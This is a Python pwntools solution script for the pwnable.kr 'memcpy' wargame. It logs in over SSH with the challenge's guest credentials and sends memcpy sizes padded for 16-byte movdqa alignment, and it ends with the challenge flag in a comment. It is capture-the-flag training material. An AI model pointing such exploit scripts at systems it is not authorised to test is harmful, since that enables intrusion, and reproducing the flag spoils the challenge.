#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# ----------------- #
# Config / defaults #
# ----------------- #
context.log_level = "info"
REMOTE_USER = "memcpy"
REMOTE_HOST = "pwnable.kr"
REMOTE_SSH_PORT = 2222
REMOTE_NC_CMD = "nc 0 9022"

### defines ###
MIN_LOW_BIT_SIZES = 3 # Start from memcpy size of 8.
MAX_ALIGN_SIZES = MIN_LOW_BIT_SIZES + 3 # Only three sizes - 8, 16, 32.
MAX_SIZES = MAX_ALIGN_SIZES + 7 # The rest of the sizes >= 64.

def start_local(exe_path: str = "./memcpy", use_gdb: bool = False):
    if use_gdb:
        return gdb.debug([exe_path], gdbscript='tbreak main\ncontinue\n')
    return process([exe_path])

def start_ssh_nc(user: str, host: str, ssh_port: int, nc_cmd: str,
                 keyfile: str = None, password: str = None):
    log.info(f"ssh -> {user}@{host}:{ssh_port} ; running: {nc_cmd}")
    ssh_client = ssh(user, host, port=ssh_port, keyfile=keyfile, password=password)
    io = ssh_client.run(nc_cmd, tty=True)
    io.ssh_client = ssh_client
    return io

def main():
    exe_path = args.EXE or "./memcpy"
    use_ssh = args.SSH
    keyfile = args.KEY or None
    password = args.PASSWORD or 'guest'
    use_gdb = args.GDB
    use_local_flag = args.LOCAL

    if use_ssh:
        io = start_ssh_nc(REMOTE_USER, REMOTE_HOST, REMOTE_SSH_PORT, REMOTE_NC_CMD,
                          keyfile=keyfile, password=password)
    else:
        io = start_local(exe_path, use_gdb=use_gdb)

# -- Exploit goes here --
    # Start from the fourth bit: b'00001000 - 8 to the sixth bit: b'00100000 - 16.
    for curr_size_bit in range(MIN_LOW_BIT_SIZES, MAX_ALIGN_SIZES):
        io.sendlineafter(" :", str(1 << curr_size_bit))
    
    # Do the rest of the sizes but add 8 for memory alignment for the opcode 'movdqa' - must use addresses with 16 bit alignment.
    for curr_size_bit in range(MAX_ALIGN_SIZES, MAX_SIZES):
        io.sendlineafter(" :", str((1 << curr_size_bit) + 8)) # Add 8 for aligning the size.

    io.interactive()

if __name__ == "__main__":
    main()

#flag: b0thers0m3_m3m0ry_4lignment
